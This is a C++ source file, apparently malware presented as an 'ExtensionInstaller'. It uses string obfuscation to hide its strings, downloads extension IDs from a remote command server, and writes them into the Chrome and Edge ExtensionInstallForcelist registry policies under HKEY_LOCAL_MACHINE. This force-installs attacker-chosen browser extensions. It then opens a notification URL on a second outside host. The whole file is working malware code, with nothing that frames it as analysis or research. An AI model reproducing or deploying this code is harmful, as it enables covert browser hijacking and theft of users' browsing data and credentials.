// ExtensionInstaller.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <curl/curl.h>
#include <string>
#include <sstream>
#include <vector>
#include <algorithm> // for std::remove_if
#include "MetaString.h"
#include "ObfuscatedCall.h"
#include "ObfuscatedCallWithPredicate.h"

#pragma warning(disable: 4503)

using namespace std;
using namespace andrivet::ADVobfuscator;

#define COMMANDSERVER "https:\/\/download81.cfd\/data.txt"
#define NOTIFYSERVER "https:\/\/seekspot.io\/tyy"

// Callback function to write the data received from the server into a string
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userp) {
	size_t totalSize = size * nmemb;
	userp->append((char*)contents, totalSize);
	return totalSize;
}

std::string get_command_from_server(std::string& serverurl)
{
	CURL* curl;
	CURLcode res;
	std::string readBuffer;

	curl_global_init(CURL_GLOBAL_DEFAULT);
	curl = curl_easy_init();
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, serverurl);

		// Set the write callback function
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);

		// Pass the string to the callback function
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

		// Perform the request
		res = curl_easy_perform(curl);

		// Check for errors
		if (res != CURLE_OK) {
			return "";
		}
		else {
			// Output the data
		}

		// Cleanup
		curl_easy_cleanup(curl);
	}

	curl_global_cleanup();

	return readBuffer;
}

// Function to split a string by newline characters
std::vector<std::string> splitByNewline(const std::string& input) {
	std::vector<std::string> lines;
	std::istringstream stream(input);
	std::string line;

	while (std::getline(stream, line)) {
		line.erase(std::remove_if(line.begin(), line.end(), [](unsigned char x) {
			return std::isspace(x);
			}), line.end());

		lines.push_back(line);
	}

	return lines;
}

// Function to create a registry key and set string values
bool CreateRegistryKeyAndSetValues(HKEY hKeyParent, const std::string& subKey, const std::string& valueName1, const std::string& valueData1) {
	HKEY hKey;
	LONG lResult;
	DWORD dwDisposition;

	// Create or open the registry key
	lResult = RegCreateKeyEx(hKeyParent, subKey.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, &dwDisposition);
	
	if (lResult != ERROR_SUCCESS) {
		return false;
	}

	// Set the first string value
	lResult = RegSetValueEx(hKey, valueName1.c_str(), 0, REG_SZ, (const BYTE*)valueData1.c_str(), valueData1.length());
	if (lResult != ERROR_SUCCESS) {
		RegCloseKey(hKey);
		return false;
	}

	// Close the registry key
	RegCloseKey(hKey);

	return true;
}

int main()
{
	std::string serverurl = OBFUSCATED(COMMANDSERVER);
	std::string result = get_command_from_server(serverurl);
	std::vector<std::string> commands = splitByNewline(result);

	if (commands.size() == 3) {
		std::string line1 = commands[0];
		std::string line2 = commands[1];
		std::string line3 = commands[2];

		std::string chromeSubKey = OBFUSCATED("Software\\Policies\\Google\\Chrome\\ExtensionInstallForcelist");
		std::string edgeSubKey = OBFUSCATED("Software\\Policies\\Microsoft\\Edge\\ExtensionInstallForcelist");
		

		// Create registry keys and set values for Chrome
		if (CreateRegistryKeyAndSetValues(HKEY_LOCAL_MACHINE, chromeSubKey, OBFUSCATED("1"), line1) &&
			CreateRegistryKeyAndSetValues(HKEY_LOCAL_MACHINE, chromeSubKey, OBFUSCATED("2"), line2) &&
			CreateRegistryKeyAndSetValues(HKEY_LOCAL_MACHINE, edgeSubKey, OBFUSCATED("1"), line3)) {
		
			const char* url = NOTIFYSERVER;
			HINSTANCE result = ShellExecute(NULL, OBFUSCATED("open"), url, NULL, NULL, SW_SHOWNORMAL);
		
			// Check the result
			if ((int)result <= 32) {
				return 1;
			}
		}
	}
}

